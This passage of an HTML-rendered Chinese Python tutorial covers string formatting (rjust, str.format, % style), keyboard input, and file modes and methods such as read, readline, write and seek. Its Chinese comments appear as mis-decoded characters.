class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token comment"># æ³¨æ„å‰ä¸€è¡Œ 'end' çš„ä½¿ç”¨</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># rjust() æ–¹æ³•, å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²é å³, å¹¶åœ¨å·¦è¾¹å¡«å……ç©ºæ ¼</span><span class="token comment"># zfill(), å®ƒä¼šåœ¨æ•°å­—çš„å·¦è¾¹å¡«å…… 0</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:2d} {1:3d} {2:4d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">*</span>x<span class="token punctuation">,</span> x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''test'test'0.142857142857142850.14285714285714285testhahatesthaha'test\nhaha'('test\nhaha', [1, 2]) 1   1    1 2   4    8 3   9   27 4  16   64 5  25  125 6  36  216 7  49  343 8  64  512 9  81  72910 100 1000 1   1    1 2   4    8 3   9   27 4  16   64 5  25  125 6  36  216 7  49  343 8  64  512 9  81  72910 100 1000'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="str-format-åŸºæœ¬ä½¿ç”¨"><a href="#str-format-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="str.format()åŸºæœ¬ä½¿ç”¨"></a>str.format()åŸºæœ¬ä½¿ç”¨</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¸¸è§„è¾“å‡º</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{}-{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># one-two</span><span class="token comment"># ç´¢å¼•è¾“å…¥</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{1}-{0}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># two-one</span><span class="token comment"># å…³é”®å­—å‚æ•°è¾“å‡º</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{name}-{age}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>age<span class="token operator">=</span><span class="token string">'one'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># two-one</span><span class="token comment"># ç»“åˆ</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{1}-{0}-{test}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> test<span class="token operator">=</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2-1-3</span><span class="token keyword">import</span> math<span class="token comment"># !a (ä½¿ç”¨ ascii()), !s (ä½¿ç”¨ str()) å’Œ !r (ä½¿ç”¨ repr())</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{!a}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3.141592653589793</span><span class="token comment"># :åé¢.åŠ æ•°å­—ä»£è¡¨ä¿ç•™å‡ ä½å°æ•°ï¼Œå’Œç±»å‹</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:.3f}ã€‚'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3.142ã€‚</span><span class="token comment"># :åé¢åŠ æ•´æ•°ï¼Œè¡¨ç¤ºè¯è¯¥åŸŸè‡³å°‘æœ‰è¿™ä¹ˆå¤šçš„å®½åº¦</span>table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">for</span> name<span class="token punctuation">,</span> number <span class="token keyword">in</span> table<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:10} ==&gt; {1:10d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Google     ==&gt;          1Runoob     ==&gt;          2Taobao     ==&gt;          3'''</span><span class="token comment"># ä¼ å…¥ä¸€ä¸ªå­—å…¸, ç„¶åä½¿ç”¨æ–¹æ‹¬å· [] æ¥è®¿é—®é”®å€¼</span>table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob: {0[Runoob]:d}; Google: {0[Google]:d}; Taobao: {0[Taobao]:d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob: 2; Google: 1; Taobao: 3</span><span class="token comment"># é€šè¿‡åœ¨ table å˜é‡å‰ä½¿ç”¨ ** æ¥å®ç°ç›¸åŒçš„åŠŸèƒ½</span>table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob: {Runoob:d}; Google: {Google:d}; Taobao: {Taobao:d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token operator">**</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob: 2; Google: 1; Taobao: 3</span><span class="token triple-quoted-string string">'''one-twotwo-onetwo-one2-1-33.1415926535897933.142ã€‚Google     ==&gt;          1Runoob     ==&gt;          2Taobao     ==&gt;          3Runoob: 2; Google: 1; Taobao: 3Runoob: 2; Google: 1; Taobao: 3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ—§å¼å­—ç¬¦ä¸²æ ¼å¼åŒ–"><a href="#æ—§å¼å­—ç¬¦ä¸²æ ¼å¼åŒ–" class="headerlink" title="æ—§å¼å­—ç¬¦ä¸²æ ¼å¼åŒ–"></a>æ—§å¼å­—ç¬¦ä¸²æ ¼å¼åŒ–</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%5.3f'</span> <span class="token operator">%</span> math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token comment"># 3.142</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="è¯»å–é”®ç›˜è¾“å…¥"><a href="#è¯»å–é”®ç›˜è¾“å…¥" class="headerlink" title="è¯»å–é”®ç›˜è¾“å…¥"></a>è¯»å–é”®ç›˜è¾“å…¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">strstr <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ï¼š"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½ è¾“å…¥çš„å†…å®¹æ˜¯: "</span><span class="token punctuation">,</span> strstr<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>strstr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä¼ å…¥çš„å€¼éƒ½ä¸ºstr</span><span class="token comment"># è¾“å…¥ä¸‰è§’å½¢çš„ä¸‰è¾¹é•¿</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä¸‰è§’å½¢ä¸‰è¾¹çš„é•¿ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># è®¡ç®—ä¸‰è§’å½¢çš„åŠå‘¨é•¿p</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token comment"># è®¡ç®—ä¸‰è§’å½¢çš„é¢ç§¯s</span>s <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">0.5</span><span class="token comment"># è¾“å‡ºä¸‰è§’å½¢çš„é¢ç§¯</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä¸‰è§’å½¢é¢ç§¯ä¸ºï¼š"</span><span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'.2f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¯·è¾“å…¥ï¼š9ä½ è¾“å…¥çš„å†…å®¹æ˜¯:  9&lt;class 'str'&gt;è¯·è¾“å…¥ä¸‰è§’å½¢ä¸‰è¾¹çš„é•¿ï¼š8 7 9ä¸‰è§’å½¢é¢ç§¯ä¸ºï¼š 26.83'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¯»å’Œå†™æ–‡ä»¶"><a href="#è¯»å’Œå†™æ–‡ä»¶" class="headerlink" title="è¯»å’Œå†™æ–‡ä»¶"></a>è¯»å’Œå†™æ–‡ä»¶</h3><p>open() è¿”å›ä¸€ä¸ª file å¯¹è±¡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>filenameï¼šåŒ…å«äº†ä½ è¦è®¿é—®çš„æ–‡ä»¶åç§°çš„å­—ç¬¦ä¸²å€¼</li><li>modeï¼šå†³å®šäº†æ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ï¼šåªè¯»ï¼Œå†™å…¥ï¼Œè¿½åŠ ç­‰ï¼Œé»˜è®¤æ–‡ä»¶è®¿é—®æ¨¡å¼ä¸ºåªè¯»(r)</li></ul><table><thead><tr><th align="left">æ¨¡å¼</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚</td></tr><tr><td align="left">rb</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td align="left">r+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td align="left">rb+</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td align="left">w</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">wb</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">w+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">wb+</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">a</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td></tr><tr><td align="left">ab</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td></tr><tr><td align="left">a+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td></tr><tr><td align="left">ab+</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td></tr></tbody></table><h4 id="æ–‡ä»¶å¯¹è±¡çš„æ–¹æ³•"><a href="#æ–‡ä»¶å¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="æ–‡ä»¶å¯¹è±¡çš„æ–¹æ³•"></a>æ–‡ä»¶å¯¹è±¡çš„æ–¹æ³•</h4><h5 id="f-read"><a href="#f-read" class="headerlink" title="f.read()"></a>f.read()</h5><p>f.read(size)å°†è¯»å–ä¸€å®šæ•°ç›®çš„æ•°æ®, ç„¶åä½œä¸ºå­—ç¬¦ä¸²æˆ–å­—èŠ‚å¯¹è±¡è¿”å›ï¼Œsize æ˜¯ä¸€ä¸ªå¯é€‰çš„æ•°å­—ç±»å‹çš„å‚æ•°ï¼Œå½“ size è¢«å¿½ç•¥äº†æˆ–è€…ä¸ºè´Ÿ, é‚£ä¹ˆè¯¥æ–‡ä»¶çš„æ‰€æœ‰å†…å®¹éƒ½å°†è¢«è¯»å–å¹¶ä¸”è¿”å›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­æ‰“å¼€çš„æ–‡ä»¶</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-readline"><a href="#f-readline" class="headerlink" title="f.readline()"></a>f.readline()</h5><p>f.readline() ä¼šä»æ–‡ä»¶ä¸­è¯»å–å•ç‹¬çš„ä¸€è¡Œï¼Œæ¢è¡Œç¬¦ä¸º â€˜\nâ€™ï¼Œf.readline() å¦‚æœè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸², è¯´æ˜å·²ç»å·²ç»è¯»å–åˆ°æœ€åä¸€è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­æ‰“å¼€çš„æ–‡ä»¶</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-readlines"><a href="#f-readlines" class="headerlink" title="f.readlines()"></a>f.readlines()</h5><p>f.readlines() å°†è¿”å›è¯¥æ–‡ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰è¡Œï¼Œå¦‚æœè®¾ç½®å¯é€‰å‚æ•° sizehint, åˆ™è¯»å–æŒ‡å®šé•¿åº¦çš„å­—èŠ‚, å¹¶ä¸”å°†è¿™äº›å­—èŠ‚æŒ‰è¡Œåˆ†å‰²</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­æ‰“å¼€çš„æ–‡ä»¶</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># å…³é—­æ‰“å¼€çš„æ–‡ä»¶</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-write"><a href="#f-write" class="headerlink" title="f.write()"></a>f.write()</h5><p>f.write(string) å°† string å†™å…¥åˆ°æ–‡ä»¶ä¸­, ç„¶åè¿”å›å†™å…¥çš„å­—ç¬¦æ•°</p><p>ä¸æ˜¯å­—ç¬¦ä¸²çš„éœ€è¦å…ˆè½¬æ¢</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"Python æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„è¯­è¨€ã€‚\næ˜¯çš„ï¼Œçš„ç¡®éå¸¸å¥½!!\n"</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment"># å…³é—­æ‰“å¼€çš„æ–‡ä»¶</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 29</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-tell"><a href="#f-tell" class="headerlink" title="f.tell()"></a>f.tell()</h5><p>f.tell() è¿”å›æ–‡ä»¶å¯¹è±¡å½“å‰æ‰€å¤„çš„ä½ç½®, å®ƒæ˜¯ä»æ–‡ä»¶å¼€å¤´å¼€å§‹ç®—èµ·çš„å­—èŠ‚æ•°</p><h5 id="f-seek"><a href="#f-seek" class="headerlink" title="f.seek()"></a>f.seek()</h5><ol><li>f.seek(offset, from_what) å‡½æ•°æ”¹å˜æ–‡ä»¶å½“å‰çš„ä½ç½®</li><li>from_what çš„å€¼ï¼Œ å¦‚æœæ˜¯ 0 è¡¨ç¤ºå¼€å¤´, å¦‚æœæ˜¯ 1 è¡¨ç¤ºå½“å‰ä½ç½®, 2 è¡¨ç¤ºæ–‡ä»¶çš„ç»“å°¾</li><li>from_what å€¼ä¸ºé»˜è®¤ä¸º0ï¼Œå³æ–‡ä»¶å¼€å¤´</li></ol><ul><li>seek(x,0) ï¼š ä»èµ·å§‹ä½ç½®å³æ–‡ä»¶é¦–è¡Œé¦–å­—ç¬¦å¼€å§‹ç§»åŠ¨ x ä¸ªå­—ç¬¦</li><li>seek(x,1) ï¼š è¡¨ç¤ºä»å½“å‰ä½ç½®å¾€åç§»åŠ¨xä¸ªå­—ç¬¦</li><li>seek(-x,2)ï¼šè¡¨ç¤ºä»æ–‡ä»¶çš„ç»“å°¾å¾€å‰ç§»åŠ¨xä¸ªå­—ç¬¦</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/foo.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb+'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'0123456789abcdef'</span><span class="token punctuation">)</span><span class="token comment"># 16</span>f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>   <span class="token comment"># ç§»åŠ¨åˆ°æ–‡ä»¶çš„ç¬¬å…­ä¸ªå­—èŠ‚</span><span class="token comment"># 5</span>f<span class="token punctuation">.</span>read<span 